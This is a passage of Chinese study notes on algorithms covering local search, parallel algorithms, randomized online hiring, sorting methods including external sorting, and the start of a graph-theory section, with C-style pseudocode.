<h2 id="vertex-cover-problem"><a class="header" href="#vertex-cover-problem">Vertex cover problem</a></h2>
<p>对于图$G=(V,E)$，找到一个点集$V'$使得$E$中所有的edge至少有一个端点在$V'$中。这是一个NPC问题。</p>
<p>我觉得这个例子特别好的解释了local和global的区别。Local search不一定能找到全局最优解的原因，很可能就是陷入了局部最优解然后出不去了。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210611150738933.png" alt="image-20210611150738933" /></p>
<p>算法描述：注意这里的else 存在一定的几率退回，这就是模拟退火的基本思路。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210611150857607.png" alt="image-20210611150857607" /></p>
<h2 id="hopfield-neural-network"><a class="header" href="#hopfield-neural-network">Hopfield neural network</a></h2>
<p>也是一个图。无向图$G=(V,E)$，每一条边都有一个权重$w_{i,j}$。如果$w_{i,j}&gt;0$说明点i,j<strong>希望</strong>有相同的状态，如果$w_{i,j}&lt;0$说明点i,j希望有不同的状态。$|w_{i,j}|$表明了希望的程度。每一个vertex都有一个二元状态$v_i=\pm 1$。</p>
<p>good vertex的定义：对于$v_i$，如果满足 $\Sigma_{j:e_{i,j}\in E} (w_{i,j}v_iv_j) \le 0$的话，那么我们认为$v_i$是good的。反之bad。</p>
<p>图的稳态：<strong>所有的v都是good</strong>。<u>我们的问题就是要找到稳态。 稳态不一定是唯一的。</u></p>
<p>找稳态的local search算法，可以是找到bad点然后改变状态。我们记$\Phi(S) = \Sigma_{e\ is\ good}|w_e|$，每次状态的改变都意味着$\Phi(S)$的增长。所以我们肯定能在有限步内达到稳态。但是这不一定是多项式的。。</p>
<pre><code class="language-c">ConfigType State_flipping()
{
    Start from an arbitrary configuration S;
    while ( ! IsStable(S) ) {
        u = GetUnsatisfied(S);
        su = - su;
    }
    return S;
}
</code></pre>
<h2 id="maximum-cut-problem"><a class="header" href="#maximum-cut-problem">Maximum cut problem</a></h2>
<p>给定一张图，求一种分割方法，将所有顶点（Vertex）分割成两群，同时使得被切断的边（Edge）数量最大。然后边也可以加权。</p>
<blockquote>
<p>Maximum Cut problem: Given an undirected graph G = (V, E) with positive integer edge weights we, find a node partition (A, B) such that the total weight of edges crossing the cut is maximized.</p>
<p><img src="Basic/DataStructure/Algorithm/../images/1280px-Max-cut.svg.png" alt="img" /></p>
</blockquote>
<p>局部贪心算法：</p>
<pre><code class="language-c">Max-Cut-Local (G, w) {
    Pick a random node partition (A, B);	//从一个可行解出发
    while (∃ improving node v) {
        if (v is in A) move v to B;
        else move v to A;
    }
    return (A, B);
}
</code></pre>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210611160001363.png" alt="image-20210611160001363" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="并行算法"><a class="header" href="#并行算法">并行算法</a></h1>
<h2 id="pram"><a class="header" href="#pram">PRAM</a></h2>
<p>Parallel Random Access Machine
PRAM 它和 RAM 一样，假设在每个单位时间，每一个 processor 可以做一个计算或者访存的操作。一共 P 个核共享一个 shared memory。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/v2-dae4751c16d477624f5359dfbb8e3dd6_720w.jpg" alt="img" /></p>
<p>这个模型通常来讲有几种模式（Memory的同步模型）：</p>
<blockquote>
<p>Exclusive read exclusive write (EREW) — 多个processor不可以同时读或者同时写同一个内存位置</p>
<p>Concurrent read exclusive write (CREW) — 多个processor 不可以同时写，但是可以同时读同一个内存位置</p>
<p>Exclusive read concurrent write (ERCW) — 不能同时读但是竟然能同时写，这个没什么意义，所以没人用它</p>
<p>Concurrent read concurrent write (CRCW) — 两个processor既可以同时读也可以同时写同一位置，花费单位时间。关于这个同时写最后结果是什么，也有许多说法，不过我们的重点不在这个模型上，就不展开了。</p>
</blockquote>
<p>然而这个模型不太现实，一个是高度同步的内存不现实，另一个是在PRAM里，一个算法需要几个 processor，这个 P 是固定的。在我们现代的多核电脑里，虽然你知道它有几个 processor，但是实际上，你不知道你能用几个。</p>
<h2 id="work-depth"><a class="header" href="#work-depth">Work-depth</a></h2>
<p>它的中心思想是说，对于我们所有算法中的操作，根据其依赖关系可以画成一张 DAG（Directed acyclic graph，有向无环图）。其中每一个节点代表一个操作，每一条有向边 A-&gt;B 意味着B这个操作必须等待A操作进行完才可以执行。我们管这张图叫 computation graph 或者computation DAG。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/v2-6a7a277250fed497c896370e14ae4c90_720w.jpg" alt="img" /></p>
<p>**一个算法的代价用两个量来衡量，一个叫 work，用 W 表示，也就是这个图总的结点数。它告诉你这个算法如果你只有一个 processor，串行地跑，它的时间复杂度是什么。**比如上图，这个数就是 17。第二就是这个图本身的深度，叫 Depth (D)，也叫 Span (S)，也就是最长的并行依赖链。在上图里，这个数是 8。<strong>这个 depth 告诉你，如果你有无数个 processor，你这个算法需要多少时间</strong>——因为即便你有无数个 processor，这些依赖关系还是要被按顺序一个等一个地执行的。</p>
<p><strong>可以证明，给定一个 DAG，W 的 work , D 的 depth , p 的 process 你总是可以通过一定的调度算法，在 W/p+O(D) 的时间内给它执行完。</strong></p>
<h2 id="examples"><a class="header" href="#examples">Examples</a></h2>
<h3 id="prefix-sum"><a class="header" href="#prefix-sum">Prefix-sum</a></h3>
<blockquote>
<p>input: a1, a2, a3, ..., an</p>
<p>output: a1, a1+a2, a1+a2+a3, ..., a1+a2+...an</p>
</blockquote>
<p>首先我们规定一个符号<img src="Basic/DataStructure/Algorithm/../images/image-20210624130050973.png" alt="image-20210624130050973" />，$(0,\alpha)$是$(h,i)$最右边的孩子的prefix-sum。我们要求解的目标其实就是$C(0,i)$。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210624130222108.png" alt="image-20210624130222108" /></p>
<p>先用Parallel算法求出$B(h,i)$。这是一个自底向上的过程，这个过程很简单。</p>
<p>然后再用Parallel算法求出$C(h,i)$，这是一个自顶向下的过程，需要分类。Work = O(n)，Time = O(log N)。证明过程是显然的。</p>
<pre><code class="language-c">for (h=log N;h&gt;=0;h--){
    for (i==1) pardo
        C[h,i] = B[h,i];
    for (i%2 == 0) pardo
        C[h,i] = C[h+1,i/2];	// parent
    for (i%2 == 1 &amp;&amp; i!=1) pardo
        C[h,i] = C[h+1,(i-1)/2] + B[h,i];
}
</code></pre>
<h3 id="merging"><a class="header" href="#merging">Merging</a></h3>
<blockquote>
<p>merge two non-decreasing arrays A(1), A(2), …, A(n) and B(1), B(2), …, B(m) into another non-decreasing array C(1), C(2), …, C(n+m) </p>
</blockquote>
<p>先定义RANK: 大意就是B中的元素在A能排第几小。</p>
<pre><code class="language-c">RANK(j, A) = i,  if A(i) &lt; B(j) &lt; A(i + 1), for 1 &lt; i &lt; n;
RANK(j, A) = 0,  if B(j) &lt; A(1);
RANK(j, A) = n,  if B(j) &gt; A(n);
</code></pre>
<p>然后我们解决Rank(A,B)，就是知道Rank(i,A) for B和Rank(i,B) for A。</p>
<p>在解决了Rank(A,B)之后，就可以用O(1)的时间和O(n+m)的work解决merging问题了，看一个例子：</p>
<pre><code class="language-c">    A = 1 3 4   B = 2 5 6
Rank    0 1 1       1 3 3	(Rank in B/A)
Where   0 1 2       0 1 2	(Position in A/B)
Result  0 2 3       1 4 5	(Position in C = Rank+Where)
</code></pre>
<p>那么我们就把问题转换成了求Rank的问题。</p>
<ol>
<li>
<p>第一个办法：并行。对A中的每个元素，在B中用Binary Search求Rank。Time = O(log n). Work = O(nlog n) （这里就当m=n了）。</p>
<pre><code class="language-c">// 这两个也是可以并行的
for 1&lt;= i &lt;= n pardo
	Rank(i,B) = BinarySearch(A(i),B);	
for 1 &lt;= i &lt;= m pardo
	Rank(i,A) = BinarySearch(B(i),A);
</code></pre>
</li>
<li>
<p>第二个办法：串行。 Time = O(n+m) Work = O(n+m)</p>
<pre><code class="language-c">i = j = 0; 
while ( i &lt;= n || j &lt;= m ) {
    if ( A(i+1) &lt; B(j+1) )
        RANK(++i, B) = j;
    else RANK(++j, A) = i;
}
</code></pre>
</li>
<li>
<p>第三个办法：并行。比第一个办法好。Time = O(log n), Work = O(n)</p>
<ol>
<li>
<p>先选择部分的(p = n/log n)个元素按照第一个办法进行ranking。那么Time = O(log n), Work = O(n)。选择的元素如下所示：</p>
<pre><code class="language-c">A_Select(i) = A(1+(i-1)log n);   for 1 &lt;= i &lt;= p;
B_Select(i) = B(1+(i-1)log n);   for 1 &lt;= i &lt;= p;
</code></pre>
</li>
<li>
<p>把上面的ranking完成之后，剩下最多有2p个子问题（绿色），每一个子问题的size都是log n级别。我们按照第二个办法进行Rank，Time = O(log n) Work = O(p log n) = O(n)</p>
</li>
</ol>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210624135659887.png" alt="image-20210624135659887" /></p>
</li>
</ol>
<h3 id="maximum-finding"><a class="header" href="#maximum-finding">Maximum Finding</a></h3>
<blockquote>
<p>从n个元素中找到最大的元素</p>
</blockquote>
<ol>
<li>
<p>方法一，两两比较，简单粗暴。Time = O(1) Work = O(n^2)</p>
<pre><code class="language-c">for Pi , 1 &lt;= i &lt;= n  pardo
    B(i) := 0
for i and j, 1 &lt;= i,j &lt;= n  pardo
    if ( (A(i) &lt; A(j)) || ((A(i) = A(j)) &amp;&amp; (i &lt; j)) )
            B(i) = 1
    else B(j) = 1
for Pi , 1 &lt;= i &lt;= n  pardo
    if B(i) == 0
       A(i) is a maximum in A
</code></pre>
</li>
<li>
<p>方法二。把元素分成$\sqrt{n}$份，每份$\sqrt{n}$个元素。用线性扫描的办法找到每一份的最大值。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210624143121481.png" alt="image-20210624143121481" /></p>
<p>然后我们有$\sqrt{n}$个块的最大值，用方法一找到他们中最大的一个就是答案。Time =O(1)  Work = O(n)</p>
<p>所以两个步骤一共需要时间<img src="Basic/DataStructure/Algorithm/../images/image-20210624143505420.png" alt="image-20210624143444059" /></p>
<p>。</p>
</li>
<li>
<p>方法三，方法二还是不够好。这一次我们把元素分成每份有$h = log(log(n))$个元素。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210624143720382.png" alt="image-20210624143720382" /></p>
<p>这样我们有$n/h$个块的最大值，用方法二找到他们中最大的一个就是答案。Time = O(h+loglog(n/h)) = O(loglog n)      W(n) = O(h×(n/h) + (n/h)loglog(n/h)) = O(n)</p>
</li>
<li>
<p>方法四，Random版本。这就不一定保证找到的是最大值了，但是效率高。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210624144923337.png" alt="image-20210624144923337" /></p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="随机化算法"><a class="header" href="#随机化算法">随机化算法</a></h1>
<p>随机化算法并不是介绍产生随机数的算法，而是指<strong>在算法中使用了随机函数，且随机函数的返回值直接或者间接的影响了算法的执行流程或执行结果</strong>的算法。</p>
<ul>
<li>
<p>拉斯维加斯算法：这个算法总是能产生正确的结果，否则就不会返回结果。<strong>采样越多，越有机会找到最优解。</strong></p>
</li>
<li>
<p>蒙特卡罗算法：总是会返回结果，但是结果不一定是正确的。但是出现不正确的答案的几率可以非常非常低，而且我们可以多次运行，每次做不同的随机选择，那么几率就更加低了。<strong>采样越多，越近似最优解。</strong></p>
</li>
</ul>
<p>这两类随机算法之间的选择，往往受到问题的局限。如果问题要求在有限采样内，必须给出一个解，但不要求是最优解，那就要用蒙特卡罗算法。反之，如果问题要求必须给出最优解，但对采样没有限制，那就要用拉斯维加斯算法。</p>
<h2 id="online-hiring"><a class="header" href="#online-hiring">Online hiring</a></h2>
<p>举个例子。假设我们有N个求职者，我们依次面试他们然后决定是否雇佣，我们只能雇佣一个人，必须面试完之后就做出决定然后不能反悔。求职者之间有好坏的顺序关系。显然我们是没有办法保证自己一定找到最好的人的，那么我们可以使用怎样的算法呢？</p>
<pre><code class="language-c">int OnlineHiring ( EventType C[ ], int N, int k )
{
    int Best = N;
    int BestQ = -1 ;
    for ( i=1; i&lt;=k; i++ ) {
        Qi = interview( i );
        if ( Qi &gt; BestQ )   BestQ = Qi;
    }
    for ( i=k+1; i&lt;=N; i++ ) {
        Qi = interview( i );
        if ( Qi &gt; BestQ ) {
            Best = i;
            break;
        }
    }
    return Best;
}
</code></pre>
<p>这样的选中最好的概率是多少呢（假设分布是随机的）？</p>
<p>如果第i个人是最好的然后被选中了：</p>
<ol>
<li>第i个是最大的$P=1/N$</li>
<li>第k+1~i-1都没有被选中，换句话说，前i-1个中最大的元素在1~k之间。$P = k/(i-1)$</li>
</ol>
<p>这两个事件是独立的所以概率是$P=\frac{k}{N(i-1)}$。</p>
<p>总的概率，$P = \Sigma_{i=k+1}^{i=N}(\frac{k}{N(i-1)})=\frac{k}{N}log(\frac{N}{k})$.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="排序算法"><a class="header" href="#排序算法">排序算法</a></h1>
<p>虽然说选择对数据进行排序，一般的编程语言标准库都会提供<code>sort</code>方法，调用它又快又简单。但是了解排序算法基本算是算法的入门课了，而且很实用。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/1610847873915.png" alt="排序算法复杂度比较" /></p>
<p><img src="Basic/DataStructure/Algorithm/../images/70.png" alt="img" /></p>
<p>图源网络</p>
<h2 id="on2的排序算法"><a class="header" href="#on2的排序算法">O(n^2)的排序算法</a></h2>
<p>O(n^2)的排序算法都很简单。</p>
<p>冒泡排序、选择排序、插入排序、希尔排序。</p>
<h3 id="插入排序"><a class="header" href="#插入排序">插入排序</a></h3>
<p>比如我们整理扑克牌。</p>
<pre><code class="language-c">void InsertionSort ( ElementType A[ ], int N ) 
{ 
    int  j, P; 
    ElementType  Tmp; 

    for ( P = 1; P &lt; N; P++ ) 
    { 
   		Tmp = A[ P ];  /* the next coming card */
    	for ( j = P; j &gt; 0 &amp;&amp; A[ j - 1 ] &gt; Tmp; j-- ) 
    		A[ j ] = A[ j - 1 ]; 
    	/* shift sorted cards to provide a position for the new coming card */
    	A[ j ] = Tmp;  /* place the new card at the proper position */
    }  /* end for-P-loop */
}
</code></pre>
<h3 id="希尔排序"><a class="header" href="#希尔排序">希尔排序</a></h3>
<p>是<strong>不稳定</strong>的排序方法，虽然比不上快排，但是代码简单。思想是一次消除多个逆序，改进版的Insertion Sort。Define an increment sequence $h_1 &lt; h_2 &lt; … &lt; h_t  ( h_1 = 1 )$，Define an $h_k$-sort at each phase for k = t, t-1, …, 1。</p>
<p>通常我们取$h_t=\lfloor N/2 \rfloor, h_k=\lfloor h_{k+1} \rfloor$（被称为希尔增量）但是这不是最高效的增量序列，最差的情况会退化成$O(N^2)$。</p>
<p>取$h_k=2^k-1$（被称为Hibbard增量）会稍微好一点，最差的情况时间复杂度为$O(N^{\frac{3}{2}})$，平均时间为$O(N^{\frac{7}{6}})$。</p>
<pre><code class="language-c">void Shellsort( ElementType A[ ], int N ) 
{ 
    int  i, j, Increment; 
    ElementType  Tmp; 
    for ( Increment = N / 2; Increment &gt; 0; Increment /= 2 )  
        /*h sequence */
        for ( i = Increment; i &lt; N; i++ ) { /* insertion sort */
            Tmp = A[ i ]; 
            for ( j = i; j &gt;= Increment; j - = Increment ) 
                if( Tmp &lt; A[ j - Increment ] ) 
                    A[ j ] = A[ j - Increment ]; 
                else 
                    break; 
            A[ j ] = Tmp; 
        } /* end for-I and for-Increment loops */
}

</code></pre>
<h3 id="冒泡排序"><a class="header" href="#冒泡排序">冒泡排序</a></h3>
<p>太简单了，不介绍了。每次把最小的一个冒泡到前面。</p>
<pre><code class="language-c">for (int time = 0; time &lt; N-1; time++) 
    for (int index = N; index &gt; time; index--) {
        if (a[index]&lt;a[index-1]) {
            swap(&amp;a[index],&amp;a[index-1]);
        }
    }
</code></pre>
<h3 id="选择排序"><a class="header" href="#选择排序">选择排序</a></h3>
<p>太简单了，不介绍了。每次把最小的一个选到前面。</p>
<pre><code class="language-c">for (int i = 0; i &lt; N-1; i++) 
    for (int j = i+1; j &lt; N; j++) {
        if (a[i]&gt;a[j]) {
            swap(&amp;a[i],&amp;a[j]);
        }
    }
</code></pre>
<h2 id="onlogn的排序算法"><a class="header" href="#onlogn的排序算法">O(nlogn)的排序算法</a></h2>
<p>比较类排序算法的时间复杂度最好就是O(nlogn)。</p>
<h3 id="快速排序"><a class="header" href="#快速排序">快速排序</a></h3>
<p>鼎鼎有名的快速排序。最坏情况的时间复杂度是$O(N^2)$，平均情况是$O(NlogN)$。是一种不稳定的算法。基本思路是分治法。</p>
<p>具体的实现（从小到大排序）</p>
<pre><code class="language-c">void  Qsort( ElementType A[ ], int Left, int Right ) 
{   
    int  i,  j; 
	ElementType  Pivot; 
    if ( Left + Cutoff &lt;= Right ) {  /* if the sequence is not too short */
        Pivot = Median3( A, Left, Right );  /* select pivot */
        /* why not set Left+1 and Right-2? Because after we ++i and --j */
        i = Left;     j = Right–1;  
        for( ; ; ) { 
            /* scan from left ,when loop ends, A[i]&gt;=Pivot */
            while ( A[++i] &lt; Pivot );
            /* scan from right */
            while ( A[––j] &gt; Pivot ); 
            if ( i &lt; j ) 
                Swap( &amp;A[ i ], &amp;A[ j ] );  /* adjust partition */
            else     
                break;  /* partition done */
        } 
        Swap( &amp;A[ i ], &amp;A[ Right - 1 ] ); /* restore pivot */ 
        Qsort( A, Left, i - 1 );      /* recursively sort left part */
        Qsort( A, i + 1, Right );   /* recursively sort right part */
    }  /* end if - the sequence is long */
    else /* do an insertion sort on the short subarray */ 
        InsertionSort( A + Left, Right - Left + 1 );
}
</code></pre>
<p>运用快排的思想，可以很好的解决找第k大元素的方法。我们每一进行qsort，可以找出第m大的元素，如果<code>m==k</code>，那么就正好找到了；如果<code>m&lt;k</code>继续找后面一部分；如果<code>m&gt;k</code>继续找前面一部分。</p>
<h3 id="堆排序"><a class="header" href="#堆排序">堆排序</a></h3>
<p>首先我们考虑一种直白的方法：</p>
<ol>
<li>把需要排序的元素建一个最小堆（时间复杂度为O(N)）。</li>
<li>每次把对堆进行DeleteMin操作，把Min存入另一个数组H。</li>
<li>我们获得了一个排好序的数组H。</li>
</ol>
<pre><code class="language-c">Algorithm 1:
{
    BuildHeap( H );	/* O(N) */
    for ( i=0; i&lt;N; i++ ) 
        TmpH[ i ] = DeleteMin( H );		/* O(lg(N)) */
    for ( i=0; i&lt;N; i++ ) 
        H[ i ] = TmpH[ i ];		/* O(1) */
}
</code></pre>
<p>这是改进版的Heap Sort，可以省了额外创建一个数组的空间：</p>
<ol>
<li>仍然是把需要排序的元素建一个最小堆。</li>
<li>注意到其实我们每次DeleteMin都会让堆的规模减一，所以我们把DeleteMin变成和最后一个元素进行交换，然后Percolate Down。</li>
</ol>
<pre><code class="language-c">id Heapsort( ElementType A[ ], int N ) 
{  
	int i; 
    for ( i = N / 2; i &gt;= 0; i-- ) /* BuildHeap */ 
        PercDown( A, i, N ); 
    for ( i = N - 1; i &gt; 0; i-- ) { 
        Swap( &amp;A[ 0 ], &amp;A[ i ] ); /* DeleteMax */ 
        PercDown( A, 0, i ); 
} 
</code></pre>
<h3 id="归并排序"><a class="header" href="#归并排序">归并排序</a></h3>
<p>二分法。对于internal sorting很少使用，但是对external sorting经常使用。</p>
<p>时间复杂度是<code>O(NlogN)</code>，空间复杂度是<code>O(NlogN)</code>，可以是<strong>稳定</strong>的。</p>
<p>传统的Merge Sort算法主要是要申请额外的空间这个部分Overhead很大，下面的例程就是为了避免这个问题。</p>
<pre><code class="language-c">void merge_pass( ElementType list[], ElementType sorted[], int N, const int length )
{
    int left=0,mid=length-1,right=2*length-1;	
    int i,j,k;
    if (right&gt;=N) right=N-1;
    while (mid&lt;N)
    {
        i=j=k=0;
        //Merge [left,mid] and [mid+1,right]
        while (i&lt;length &amp;&amp; j&lt;right-mid)
            if (list[i+left]&lt;list[j+mid+1]) sorted[left+k++] = list[i++ +left];
            else sorted[left+k++] = list[j++ +mid+1];
        while (i&lt;length) sorted[left+k++] = list[i++ +left];
        while (j&lt;right-mid) sorted[left+k++] = list[j++ +mid+1];

        left+=2*length;
        mid+=2*length;
        right+=2*length;
        if (right&gt;=N) right=N-1;     
    }
}

void  merge_sort( ElementType list[],  int N )
{
    ElementType extra[MAXN];  /* the extra space required */
    int  length = 1;  /* current length of sublist being merged */
    while( length &lt; N ) { 
        merge_pass( list, extra, N, length ); /* merge list into extra */
        length *= 2;
        merge_pass( extra, list, N, length ); /* merge extra back to list */
        length *= 2;
    }
} 
</code></pre>
<p><strong>归并排序适合大数据的排序</strong></p>
<h3 id="tim-sort"><a class="header" href="#tim-sort">Tim Sort</a></h3>
<p>Tim sort 是一种混合稳定的排序算法，源自合并排序和插入排序，旨在较好地处理真实世界中各种各样的数据。Java的<code>Arrays.sort()</code>、Python的<code>sort()</code>、Rust的<code>sort</code>都采用了Tim Sort算法。<sup class="footnote-reference"><a href="#2">1</a></sup></p>
<h2 id="非比较类排序算法"><a class="header" href="#非比较类排序算法">非比较类排序算法</a></h2>
<h3 id="桶排序"><a class="header" href="#桶排序">桶排序</a></h3>
<p>思路是<sup class="footnote-reference"><a href="#1">2</a></sup></p>
<ol>
<li>将待排序元素划分到不同的痛。先扫描一遍序列求出最大值 maxV 和最小值 minV ，设桶的个数为 k ，则把区间 [minV, maxV] 均匀划分成 k 个区间，每个区间就是一个桶。将序列中的元素分配到各自的桶。</li>
<li>对每个桶内的元素进行排序。可以选择任意一种排序算法。</li>
<li>将各个桶中的元素合并成一个大的有序序列。</li>
<li>假设数据是<strong>均匀分布</strong>的，则每个桶的元素平均个数为 $n/k $。假设选择用快速排序对每个桶内的元素进行排序，那么每次排序的时间复杂度为 $O(n/klog(n/k))$ 。总的时间复杂度为 $O(n)+O(k)O(n/klog(n/k)) = O(nlog(n/k))$ 。当 k 接近于 n 时，桶排序的时间复杂度就可以金斯认为是 O(n) 的。即桶越多，时间效率就越高，而桶越多，空间就越大。</li>
</ol>
<p>根据桶排序的思路，可以得到<strong>计数排序</strong>，把区间[minV, maxV]中的每一个数单独给出一个区间。这样一趟扫描就排好了序，其实就是统计每一个数字出现的次数。显然，这种排序方法适合数字区间不大的情况。</p>
<h3 id="基数排序"><a class="header" href="#基数排序">基数排序</a></h3>
<p>他的思路是，从**最低位(最低位和进制有关的说)<strong>开始，依次进行一次&quot;桶排序&quot;。这样</strong>从最低位一直到最高位(也可以是从最高位到最低位，但是从低到高一般比较好)**排序完成以后，整个序列就变成了一个有序序列。举个例子会清楚一点</p>
<p>假设要排序的数字序列为 0x1 0xf 0x2d 0x323 0x14，从最低位开始排序</p>
<ul>
<li>第一次排序(0x1 0x14) (0x323) (0x2d) (0xf) </li>
<li>第二次排序(0x01 0x0f) (0x14) (0x323 0x2d)</li>
<li>第三次排序(0x001 0x00f 0x014 0x02d) (0x323)</li>
<li>假设数据类型是u32，那就一共进行8次排序（一次4位）。你也可以先扫描一遍看看最大的值是多少然后决定进行几次排序。</li>
</ul>
<p>时间复杂度为$O(kn)$，n是排序元素个数，k是位数。空间复杂度为$O(k+n)$。选择合适的进制下，k一般不大于logn，基数排序一般要快过基于比较的排序。</p>
<p>所以为什么一般编程语言标准库的排序算法还是基于排序的呢？因为如果要使用基数排序我们需要让元素有&quot;基数&quot;这个概念，而比较排序只需要&quot;比较&quot;这个概念，后者实现简单直接。而且比较排序的算法性能一般也够用了。<sup class="footnote-reference"><a href="#3">3</a></sup></p>
<h2 id="外排序"><a class="header" href="#外排序">外排序</a></h2>
<p>主要是为了解决很多数据以至于内存中放不下的情况。评价普通的排序只需要考虑时间复杂度，评价外排序要考虑</p>
<ol>
<li>seek time $O(pass)$ 寻道次数</li>
<li>time to read or write one block of records</li>
<li>internal sort M records</li>
<li>merge  N records from input buffer to output buffer</li>
</ol>
<h3 id="基本的外排序思想"><a class="header" href="#基本的外排序思想">基本的外排序思想</a></h3>
<p>假设我们的内存能容纳M个数据，我们一共有N个数据存储在Tape 1上。</p>
<ol>
<li>依次读取M个数据，在主存中进行排序。然后分别写入Tape 2和Tape 3。从这时候开始，数据被分成了N/M个有序的<strong>顺串</strong>。</li>
<li>然后合并T2+T3=&gt;T1+T4， T1+T4=&gt;T2+T3。每次我们都可以将块的数量/2</li>
<li>直到两边块的数量都是1,然后合并到一个Tape上。排序结束。</li>
</ol>
<p>比如下面这个例子，Memory里可以容纳2个数据。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210623233956092.png" alt="image-20210623233956092" /></p>
<p>所以我们不难发现，pass = $1+log_2(N/M)$。1指的是第一次读取全部的数据进行排序，$log_2(N/M)$指的是后面归并的过程。</p>
<h3 id="k-way-merge"><a class="header" href="#k-way-merge">k-way merge</a></h3>
<p>可以减小pass，减小seek次数。上面的其实就是2-way merge。对于k-way merge ，$pass=1+log_k(N/M)$。</p>
<p>过程：以3-way 为例，从3个磁盘中读取出一个数，维护一个（我觉得MinHeap也可以？不知道为什么是）<strong>Loser tree</strong>。Tree的根节点一定是最小的元素，把它写出来，读一个新的进去。如此反复。</p>
<p>In general, for a k-way merge we need <strong>2k</strong> input buffers and <strong>2</strong> output buffers for parallel operations.</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210629172306158.png" alt="image-20210629172306158" /></p>
<h3 id="polyphase-merge"><a class="header" href="#polyphase-merge">Polyphase Merge</a></h3>
<p>上面提到的k-way Merge 需要2k个磁带，事实上我们只使用K+1个磁带也可以完成工作。比如下面的2路归并排序，我们只需要三个磁盘，按照斐波那契数列的规则把初始数据分到磁盘上。可以通过填充的方式变成斐波那契数个数据。</p>
<p>对于一般的k，$F(k)(n) = F(k)(n - 1) + F(k)(n - 2) + ... + F(k)(n - k)$, with the appropriate initial conditions $F(k)(i) = 0, 0\le i\le k - 2, F(k)(k - 1) =1$。</p>
<pre><code class="language-c">T1    0       13        5        0       3        1        0        1
T2   21        8        0        5       2        0        1        0
T3   13        0        8        3       0        2        1        0
</code></pre>
<p>k=3一个例子：此时的斐波那契数列为 0 0 1 1 2 4 7 13 24 ... 所以下面这个黑色的表和斐波那契数列有什么关系？我们重新排列，把每一行的0排到后面去，然后竖着看：</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210707125000095.png" alt="image-20210707125000095" /><img src="Basic/DataStructure/Algorithm/../images/image-20210707125109675.png" alt="image-20210707125109675" /></p>
<h3 id="replacement-selection"><a class="header" href="#replacement-selection">Replacement selection</a></h3>
<p>我们之前构造<strong>顺串</strong>的做法是，读取M个元素，在内存中排好序，输出到磁带。所以我们会得到$N/M$个顺串。但其实这个步骤是可以优化的，每次把一个记录写回磁盘之后，又可以再读入新的数据。</p>
<pre><code class="language-c">T[1] = {81,94,11,96,12,35,17,99,28,58,41,75,15}
如果按照标准分法3-way merge，会是
T[2] = {11,81,94;	41,58,75;}
T[3] = {12,35,96;	15;}
T[4] = {17,28,99;}

        H[1]   H[2]     H[3]       OUTPUT          NEXT

Run 2    12     35       17          12             99
         17     35       99          17             28
         28     99       35          28             58
         35     99       58          35             41
         41     99       58          41             15*
         58     99       15*         58         end of tape
         99              15*         99
                         15*       End of Run.  Rebuild Heap	当然，如果数据读完了，一轮也就结束了
---
Run 3    15                          15
            
所以我们得到
T[2] = {11,81,95,96;}
T[3] = {12,17,28,35,41,58,75,99;}
T[4] = {15;}
</code></pre>
<p>通过这种方式得到的顺串，<strong>平均长度是2M</strong>。</p>
<p>这样得到的串的长度就不是相等的了，有什么好办法减小顺串的Merge time呢？答案是Huffman tree。</p>
<blockquote>
<p>Suppose we have 4 runs of length 2, 4, 5, and 15, respectively.    How can we arrange the merging to obtain minimum merge times?
<img src="Basic/DataStructure/Algorithm/../images/image-20210629192037397.png" alt="image-20210629192037397" />
Total merge time = O ( the weighted external path length )</p>
</blockquote>
<p>其实我挺好奇，我们真的可以决定merge的顺序吗？因为同一个磁带上的两个顺串如果相互merge的话基本上就是把磁带当成一个随机访问而不是顺序访问了。不过不管了。</p>
<hr />
<p>参考链接：</p>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">2</sup>
<p>https://blog.csdn.net/qq_19446965/article/details/81517552</p>
</div>
<div class="footnote-definition" id="2"><sup class="footnote-definition-label">1</sup>
<p>维基百科 Timsort https://en.wikipedia.org/wiki/Timsort</p>
</div>
<div class="footnote-definition" id="3"><sup class="footnote-definition-label">3</sup>
<p>为什么时效上具有明显优势的基数排序（radix sort）没有快速排序流行？https://www.zhihu.com/question/27064078</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="graph"><a class="header" href="#graph">Graph</a></h1>
<p>图是由顶点/节点和边构成的。图通常用来描述某些事物之间的某种特定关系。顶点用于代表事物，连接两顶点的边则用于表示两个事物间具有这种关系。有广泛的应用，很多问题都可以建模为图。</p>
<p><strong>图 (graph)</strong> 是一个二元组$G = (V(G), E(G))$，常用$G=(V, E)$表示。</p>
<ul>
<li>$V(G)$是非空集，称为 <strong>点集 (vertex set)</strong>，对于$V$中的每个元素，我们称其为 <strong>顶点 (vertex)</strong> 或 <strong>节点 (node)</strong>，简称<strong>点</strong>；</li>
<li>$E(G)$为$V(G)$各结点之间边的集合，称为 <strong>边集 (edge set)</strong>。</li>
</ul>
<p>图相关的概念</p>
<ul>
<li>
<p>图$G$的点数$|V(G)|$也被称为图$G$的 <strong>阶 (order)</strong>。</p>
</li>
<li>
<p>若$G$的每条边$e = (u,v)$ 都被赋予一个数作为该边的 <strong>权</strong>，则称$G$为 <strong>赋权图</strong>。如果这些权都是正实数，就称$G$ 为 <strong>正权图</strong>。</p>
</li>
<li>
<p><strong>简单图 (simple graph)</strong>：若一个图中没有自环（有边$e = (u,u)$）和重边（有边$e_1=e_2$），它被称为简单图。</p>
</li>
<li>
<p>度</p>
<ul>
